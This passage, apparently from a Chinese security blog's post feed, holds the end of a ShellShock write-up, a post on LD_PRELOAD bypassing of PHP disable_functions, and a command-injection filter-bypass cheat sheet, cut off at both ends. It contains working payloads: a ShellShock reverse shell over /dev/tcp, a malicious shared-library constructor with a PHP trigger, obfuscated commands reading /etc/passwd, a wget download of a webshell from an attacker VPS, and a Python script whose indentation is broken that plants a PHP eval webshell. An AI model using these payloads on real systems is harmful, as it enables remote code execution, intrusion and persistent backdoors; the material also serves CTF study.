那么它们的值将会发生变化</code></pre><p>   上述内容可以参考 <strong><a href="https://unixpapa.com/incnote/setuid.html" target="_blank" rel="noopener">Unix Incompatibility Notes: UID Setting Functions</a></strong></p><p>   其实 , <strong><code>privileged mode</code></strong> 的值是被默认定义为 0 的 , 所以我并不明白这里的判断有什么实际含义 . 网络上也没有谁给出具体的答案 , 如果您知道 , 欢迎留言 .</p><p>   <a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_13-51.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_13-51.png" alt="img"></a></p><p>后面就没什么好说的了 , 我们输入的恶意代码会被带入 <code>parse_and_execute()</code> 函数 , 该函数类似其他高级语言( 例如 PHP )中的 <code>eval</code> 函数 , 能够解析并执行字符串 .</p><hr><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>现在关于 ShellShock 漏洞产生的原因已经分析的差不多了 , 但是还存在一些疑问 . 比如为什么一个在 Bash 上的漏洞会影响到 Web 服务? 为什么攻击者可以通过 Web 页面攻击主机 Shell ?</p><p>在 <strong><a href="https://www.guildhab.top/?p=1221" target="_blank" rel="noopener">PHP-FPM 学习笔记</a></strong> 一文中我提到过使用 CGI 脚本生成 HTML 页面的具体流程 . 其实 , 不只是 PHP , 像 Perl , Python , Bash 等脚本语言都可以用于编写 CGI 脚本 .</p><p>而 Bash 可能是用于 CGI 脚本编写中最简单的语言了 . 用 Bash 来进行 CGI 编程的最大优势是它能够直接访问所有的标准 GNU 工具和系统程序 .</p><p>那么为什么系统环境变量会影响到 CGI 脚本的执行呢 ?</p><pre><code>     CGI 脚本会继承系统的环境变量 . CGI 环境变量在CGI程序启动时初始化 , 在结束时销毁 .      当一个 CGI 脚本未被 HTTP 服务器调用时 , 它的环境变量几乎是系统环境变量的复制 . 当这个 CGI 脚本被 HTTP 服务器调用时 , 它的环境变量就会增加关于 HTTP 服务器 , 客户端 , CGI传输过程等条目 .</code></pre><p>具体内容可以参考 <strong><a href="https://blog.csdn.net/weixin_39609623/article/details/86312439" target="_blank" rel="noopener">WEB-CGI 详解</a></strong> 这篇文章 , 我们要知道的是 : 当 CGI 脚本接收到一次 HTTP 请求 , 它的环境变量就会新增一些条目 , 比如 <strong><code>User-Agent</code></strong> , <strong><code>Connection</code></strong> 等信息 .</p><p>因此 , 在给出的 POC 中 , 我们通过修改 <strong><code>User-Agent</code></strong> 来修改 CGI 环境变量</p><p><strong>Payload : <code>() { :; };echo;/usr/bin/id;</code></strong></p><p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_14-56.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_14-56.png" alt="img"></a></p><p>这里 <code>echo;</code> 是不可以省略的 , 相当于换行符 . HTTP Header 一行只对应一个键值对 .</p><p>由于该 CGI 脚本是用 Bash 编写的 , 所以我们可以直接访问标准 GNU 工具库 , 比如 <code>/usr/bin/id</code> .</p><p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_14-59-2.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_14-59-2.png" alt="img"></a></p><p>这里修改 HTTP Header 的其他字段也都是可以的 , 比如现在修改 <code>Connection</code> 字段的值</p><p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_15-06.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_15-06.png" alt="img"></a></p><p>其实本质上都是通过修改 HTTP Header 来修改 CGI 程序的环境变量 , 间接修改 Bash 环境变量 , 触发 ShellShock 漏洞 , 执行恶意代码 .</p><p>我们还可以通过 ShellShock 反弹 Shell , 以便更深入的利用</p><p><strong>Payload : <code>() { :; };echo;/bin/bash -i &gt;&amp; /dev/tcp/你的服务器地址/2333 0&gt;&amp;1;</code></strong></p><p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_15-14.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_15-14.png" alt="img"></a></p><p>成功拿到目标主机的 Shell .</p><p>其实在 <code>Metasploit-Framework</code> 中早已集成了 ShellShock 的 Exploit , 利用比较简单 , 这里就不演示了~</p><hr><h4 id="漏洞利用场景"><a href="#漏洞利用场景" class="headerlink" title="漏洞利用场景"></a>漏洞利用场景</h4><p>既然 <code>ShellShock</code> 的本质是注入漏洞 , 那么漏洞利用的场景就非常好判断了</p><ol><li><strong>程序在某一时刻使用 bash 作为脚本解释器处理环境变量赋值</strong></li><li><strong>环境变量的赋值字符串来源于用户输入 , 且没有通过有效的过滤</strong></li></ol><p>若满足以上两个条件 , 该站点很有可能存在 ShellShock 漏洞~</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> PHP </tag>
            
            <tag> bypass disable functions </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LD_PRELOAD</title>
      <link href="/2021/03/04/2021-3-4-ld-preload/"/>
      <url>/2021/03/04/2021-3-4-ld-preload/</url>
      
        <content type="html"><![CDATA[<h1 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h1><blockquote><p><strong><code>LD_PRELOAD：</code></strong><br>是Linux系统的一个环境变量，它指定的<em>.so文件会在程序本身的</em>.so文件之前被加载。<br><strong><code>putenv()：</code></strong><br>PHP函数，可以设置环境变量<br><strong><code>mail()，error_log()</code></strong><br>PHP函数，在运行时会执行系统中的程序：<code>sendmail</code></p></blockquote><p>构造一个带命令执行的<code>eval.os</code>文件，让其被<code>LD_PRELOAD</code>加载；然后在PHP中调用<code>mail</code>函数或<code>error_log</code>函数，函数内部会执行系统的<code>sendmail</code>命令；这样我们构造的<code>eval.os</code>就会加载并覆盖sendmail本应调用的库函数，达到命令执行的效果。</p><p>写一个hack.c文件</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span> </span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">hack</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo any_other_eval_code"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/readflag > /tmp/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>__attribute__ ((__constructor__))</code>这个参数，它的效果是使得被自己修饰的函数在main函数前执行。</p><blockquote><p>C 语言扩展修饰符<br><strong>attribute</strong>((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <strong>attribute</strong>((constructor))<br>修饰的函数。</p></blockquote><p>然后使用gcc命令（实测我的windows上的gcc编译出来的so文件没用，kali上的有用，后来得知必须在相同系统下编译的才有用，这里理所当然是inux系统，现在想想，毕竟是动态链接库，不同系统怎么可能有用）</p><pre class="line-numbers language-bash"><code class="language-bash">gcc -shared -fPIC hack.c -o eval.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将这个源文件编译成动态链接库文件，并将其上传到服务器的<code>/tmp</code>目录下。（就得是<code>/tmp/</code>其它目录也执行不了）</p><p><code>shell.php</code>文件：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD=/tmp/eval.so"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mail</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_log</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用文件包含或者写入一个可执行php文件的形式都行</p><p>这样它就会执行那个恶意的so文件了</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> ctf </tag>
            
            <tag> bypass disable functions </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初级命令执行绕过总结</title>
      <link href="/2021/02/25/2021-2-25-chu-ji-ming-ling-zhi-xing-rao-guo-zong-jie/"/>
      <url>/2021/02/25/2021-2-25-chu-ji-ming-ling-zhi-xing-rao-guo-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h2><pre><code>${IFS} </code></pre><pre><code>$IFS$9$IFS$1</code></pre><p>$IFS在linux下表示分隔符，单纯的cat$IFSxxx，bash解释器会把整个IFSxxx当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，为什么要用$9呢？因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。$1同理</p><pre><code>&lt;</code></pre><pre><code>&lt;&gt;</code></pre><p>上面这俩也可以当空格使用</p><pre><code>{cat,flag.php}  //用逗号实现空格功能，需要用{}括起来</code></pre><pre><code>%20%09</code></pre><p>如果命令执行环境是php环境，就可以使用%09替换空格符</p><p>对于 &gt;,+ 等 符号的过滤</p><pre><code>$PS2代替&gt;$PS4代替+</code></pre><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><p>先说最常规的</p><pre><code>; </code></pre><p>表示顺序地独立执行各条命令， 彼此之间不关心是否失败， 所有命令都会执行</p><pre><code>&amp;</code></pre><p> 表示任务在后台执行，如要在后台运行redis-server,则有 redis-server &amp;</p><pre><code>&amp;&amp;</code></pre><p> 表示前一条命令执行成功时，才执行后一条命令 ，如 echo ‘1‘ &amp;&amp; echo ‘2’</p><pre><code>| </code></pre><p>表示管道，上一条命令的输出，作为下一条命令参数，如 echo ‘yes’ | wc -l</p><pre><code>|| </code></pre><p>表示上一条命令执行失败后，才执行下一条命令，如 cat nofile || echo “fail”</p><p>在php环境下，也有url编码的符号可以代替分隔符</p><pre><code>%0a        //换行符，即\n%0d        //回车符，即\r</code></pre><h2 id="命令终止符"><a href="#命令终止符" class="headerlink" title="命令终止符"></a>命令终止符</h2><p>php环境中</p><pre><code>%00 %20#</code></pre><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><p><strong>连接符</strong></p><pre><code>''        //单引号""        //双引号··         //这是反引号，就是键盘esc下面那个/</code></pre><p>如果过滤的不严就可以用这些填充到字符串中间来绕过黑名单</p><pre><code>wh\o\ami    //反斜线绕过who"a"mi    //双引号绕过whoa'm'i    //单引号绕过whoam``i    //反引号绕过echo d2hvYW1p|base64 -d|sh  //base64绕过,其中d2hvYW1p是whoami的base64编码echo d2hvYW1p|base64 -d|bash//base64绕过,其中d2hvYW1p是whoami的base64编码`echo d2hvYW1p|base64 -d` //将其base64解码,然后用反引号来执行命令echo 77686F616D69 | xxd -r -p | bash //hex绕过,其中77686F616D69是whoami的hex编码//$*和$@，$x (x为1-9),${x}(x&gt;=10) :比如ca${21}t a.txt表示cat a.txt    在没有传入参数的情况下,这些特殊字符默认为空,如下:wh$1oamiwho$@amiwhoa$*mi</code></pre><pre><code>还有一种骚操作666`whoami`666      //bash: 666root666: command not found666`\whoami`666     //bash: 666root666: command not found//命令执行后的结果在2个666中间</code></pre><pre><code>w`f1hgb`ho`f1hgb`am`f1hgb`i     //反引号的作用是把括起来的字符当做命令执行w`\f1hgb`ho`\f1hgb`am`\f1hgb`i  //这个反斜线作用就是平时的那种连接,反引号的作用是把括起来的字符当做命令执行wh$(f1hgb)oa$(f1hgb)mi            //和上面的差不多,都是执行和拼接</code></pre><p><strong>拼接变量</strong></p><p>linux系统中可以把字符变量拼接起来当作命令执行</p><pre><code>a=l;b=s;$a$b        //这就相当于先给a、b赋值，然后拼接成 ls 命令</code></pre><p>还可以从字符串变量中取一部分字符出来用于拼接</p><pre><code>a=fly;b=age;        //可以用两种方式拼接出flag字符${a:0:1}${a:1:1}${b:0:1}${b:1:1}或者${a:0:2}${b:0:2}都可以表示"flag"</code></pre><p>第一个冒号: 后的数字代表截取开始的位置，第二个冒号后的代表截取的字符数</p><p>而Linux是有环境变量的，从而</p><p><strong>利用Linux的环境变量</strong></p><pre><code>echo ${PATH}   /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binecho ${PATH:1:9}usr/local</code></pre><p>所以,我们可以通过截断和拼接来得到我们想要的来getshell</p><pre><code>${PATH:5:1}    //l${PATH:2:1}    //s${PATH:5:1}${PATH:2:1} //拼接后是ls,执行命令${PATH:5:1}s           //拼接后是ls,执行命令</code></pre><h2 id="文件名绕过"><a href="#文件名绕过" class="headerlink" title="文件名绕过"></a>文件名绕过</h2><pre><code>cat fl[abc]g.php                                 //匹配[abc]中的任何一个cat f[a-z]ag.txt                                 //匹配a-z范围的任何字符cat fla*                                         //用*匹配任意a=f;d=ag;c=l;cat $a$c$d.php 表示cat flag.php       //内联执行</code></pre><pre><code>利用正则:比如要读取etc/passwdcat /???/??????cat /???/pass*cat /etc$u/passwd</code></pre><h2 id="命令执行函数绕过"><a href="#命令执行函数绕过" class="headerlink" title="命令执行函数绕过"></a>命令执行函数绕过</h2><p>这里只举例<code>system()</code></p><pre><code>system("cat /etc/passwd")="\x73\x79\x73\x74\x65\x6d"("cat /etc/passwd");=(sy.(st).em)("cat /etc/passwd");=//还可以用注释方法绕过"system/*fthgb666*/("cat /etc/passwd);"="system/*fthgb666*/(wh./*fthgb666*/(oa)/*fthgb666*/.mi);"="(sy./*fthgb666*/(st)/*fthgb666*/.em)/*fthgb666*/(wh./*fthgb666*/(oa)/*fthgb666*/.mi);"</code></pre><h2 id="限制字数的命令执行"><a href="#限制字数的命令执行" class="headerlink" title="限制字数的命令执行"></a>限制字数的命令执行</h2><p><strong>linux下创建文件的命令可以用1&gt;1创建文件名为1的空文件</strong></p><p>a&gt;1也可以，虽然会报错，但是还是可以创建空文件。</p><p>ls&gt;1可以直接把把ls的内容导入一个文件中,但是会默认追加\n，</p><p>但是shell脚本里面是支持用转义字符转移换行符的 , 所以虽然命令被分解到了每一行 , 但是被转义了以后就相当于是一条命令了</p><pre><code>&lt;?phpif(strlen($_GET[1])&lt;8){     echo shell_exec($_GET[1]);}?&gt;</code></pre><p>简单的代码，可以利用</p><pre><code>1&gt;wget\1&gt;你的vps域名.\1&gt;com\1&gt;-O\1&gt;she\1&gt;ll.p\1&gt;hp        //这里可以拼接成任何你想执行的命令，上面这是从你的vps上下载一个shell.php来: wget xxx.com -O shell.phpls&gt;ash a</code></pre><p>这里注意’.’不能作为文件名的开头，因为linux下’.’是隐藏文件的开头，ls列不出来，需要ls -a</p><p>然而这里还有个问题，就是ls下的文件名是按照字母顺序排序的，所以需要基于时间排序</p><pre><code>把ls&gt;a改成ls -t&gt;a</code></pre><p>附上大佬的详解</p><p><img src="/img/image-20210225231156002.png" alt="image-20210225231156002"></p><p>图片中的脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python </span> <span class="token keyword">import</span> requests <span class="token keyword">import</span> base64  url <span class="token operator">=</span> <span class="token string">"https://web2.sniperoj.cn:10008/"</span>  <span class="token keyword">def</span> <span class="token function">add_slashes</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>      cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"\\."</span><span class="token punctuation">)</span>      cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">,</span> <span class="token string">"\\\\"</span><span class="token punctuation">)</span>      cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"\\/"</span><span class="token punctuation">)</span>      cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token string">"\\|"</span><span class="token punctuation">)</span>      cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span> <span class="token string">"\\&amp;"</span><span class="token punctuation">)</span>      cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">"\\-"</span><span class="token punctuation">)</span>      cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">"\\&lt;"</span><span class="token punctuation">)</span>      cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"\\>"</span><span class="token punctuation">)</span>      cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"\\#"</span><span class="token punctuation">)</span>      cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"\\ "</span><span class="token punctuation">)</span>      cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">,</span> <span class="token string">"\\="</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> cmd <span class="token keyword">def</span> <span class="token function">exec_cmd</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> max_length<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">print</span> <span class="token string">"[+] cmd : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>     cmd <span class="token operator">=</span> add_slashes<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>     <span class="token keyword">print</span> <span class="token string">"[+] Full cmd : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>     <span class="token keyword">if</span> len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token operator">&lt;</span> max_length<span class="token punctuation">:</span>         <span class="token keyword">return</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"?c="</span> <span class="token operator">+</span> cmd<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1135</span> <span class="token operator">-</span> <span class="token number">57</span><span class="token punctuation">]</span> every_length <span class="token operator">=</span> max_length <span class="token operator">-</span> len<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span> <span class="token operator">-</span> len<span class="token punctuation">(</span><span class="token string">"\\\\"</span><span class="token punctuation">)</span>     times <span class="token operator">=</span> len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token operator">/</span> every_length     <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> times <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         index <span class="token operator">=</span> i <span class="token operator">*</span> every_length <span class="token operator">-</span> <span class="token number">1</span>         <span class="token keyword">if</span> cmd<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"\\"</span><span class="token punctuation">:</span>             cmd <span class="token operator">=</span> cmd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\\"</span> <span class="token operator">+</span> cmd<span class="token punctuation">[</span>index<span class="token punctuation">:</span><span class="token punctuation">]</span>             cmds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>             <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span>times<span class="token punctuation">)</span><span class="token punctuation">:</span>                 every <span class="token operator">=</span> cmd<span class="token punctuation">[</span>every_length <span class="token operator">*</span> i<span class="token punctuation">:</span>every_length <span class="token operator">*</span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>                 true_cmd <span class="token operator">=</span> <span class="token string">">%s\\\\"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>every<span class="token punctuation">)</span>                 cmds<span class="token punctuation">.</span>append<span class="token punctuation">(</span>true_cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\\\\\\"</span><span class="token punctuation">,</span> <span class="token string">"\\\\"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                 end_cmd <span class="token operator">=</span> <span class="token string">">%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">[</span>times <span class="token operator">*</span> every_length<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                 <span class="token keyword">if</span> len<span class="token punctuation">(</span>end_cmd<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                     cmds<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> cmds<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> cmds<span class="token punctuation">.</span>append<span class="token punctuation">(</span>end_cmd<span class="token punctuation">)</span>                     <span class="token keyword">for</span> i <span class="token keyword">in</span> cmds<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                         target <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"?c="</span> <span class="token operator">+</span> i <span class="token keyword">print</span> <span class="token string">"[+] Sending : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>target<span class="token punctuation">)</span>                         requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">)</span>                         requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"?c="</span> <span class="token operator">+</span> <span class="token string">"ls -t>1"</span><span class="token punctuation">)</span>                         requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"?c="</span> <span class="token operator">+</span> <span class="token string">"sh 1"</span><span class="token punctuation">)</span>                         exec_cmd<span class="token punctuation">(</span><span class="token string">"echo %s>6"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">"&lt;?php eval($_POST[c]);?>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>                         exec_cmd<span class="token punctuation">(</span><span class="token string">"cat 6|base64 -d>c"</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>                         exec_cmd<span class="token punctuation">(</span><span class="token string">"cp c c.php"</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>                         <span class="token keyword">print</span> <span class="token string">"[%s]"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">64</span><span class="token punctuation">)</span>                         <span class="token keyword">print</span> <span class="token string">"[+] Upload webshell successful!"</span>                         <span class="token keyword">print</span> <span class="token string">"[+] Webshell is stored at : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"c.php"</span><span class="token punctuation">)</span>                         <span class="token keyword">print</span> <span class="token string">"[+] password : c"</span>                         <span class="token keyword">print</span> <span class="token string">"[%s]"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">64</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大佬发出来的已经没有缩进了，脚本本身我还没细看，只是简单的加了几个回车，等有时间仔细学习的时候再修改一下缩进</p><h2 id="PHP绕过小技巧"><a href="#PHP绕过小技巧" class="headerlink" title="PHP绕过小技巧"></a>PHP绕过小技巧</h2><h3 id="php短标签"><a href="#php短标签" class="headerlink" title="php短标签"></a>php短标签</h3><p>PHP 会寻找起始和结束标记，也就是   <code>&lt;?php</code> 和 <code>?&gt;</code>，这告诉   PHP 开始和停止解析二者之间的代码。此种解析方式使得 PHP   可以被嵌入到各种不同的文档中去，而任何起始和结束标记之外的部分都会被   PHP 解析器忽略。  </p><p>​    PHP 有一个 echo 标记简写 <code>&lt;?=</code>，    它是更完整的 <code>&lt;?php echo</code> 的简写形式。   </p><p><strong>标准文档</strong></p><p><strong>示例 #1 PHP 开始和结束标记</strong></p><pre><code> 1. &lt;?php echo 'if you want to serve PHP code in XHTML or XML documents,        use these tags'; ?&gt;2. You can use the short echo tag to &lt;?= 'print this string' ?&gt;.  It's equivalent to &lt;?php echo 'print this string' ?&gt;.3. &lt;? echo 'this code is within short tags, but will only work '.      'if short_open_tag is enabled'; ?&gt; </code></pre><p>​    短标记 (第三个例子) 是被默认开启的，但是也可以通过    <a href="https://www.php.net/manual/zh/ini.core.php#ini.short-open-tag" target="_blank" rel="noopener">short_open_tag</a>    php.ini 来直接禁用。如果 PHP 在被安装时使用了 <strong>–disable-short-tags</strong>    的配置，该功能则是被默认禁用的。   </p><p><strong>注意</strong>:      </p><p>​      因为短标记可以被禁用，所以建议使用普通标记 (<code>&lt;?php ?&gt;</code> 和 <code>&lt;?= ?&gt;</code>) 来最大化兼容性。     </p><h3 id="0a绕过"><a href="#0a绕过" class="headerlink" title="%0a绕过"></a>%0a绕过</h3><p><strong>在正则表达式中</strong></p><p>因为以’^’开头，以’$’结尾的只能匹配一行，也就是说我们可以用<code>%0a</code>，即url编码下的换行\n去绕过正则匹配</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>py2与py3中使用urllib库的不同点</title>
      <link href="/2021/02/17/2021-2-17-urllib-ku-shi-yong-bi-ji/"/>
      <url>/2021/02/17/2021-2-17-urllib-ku-shi-yong-bi-ji/</url>
      
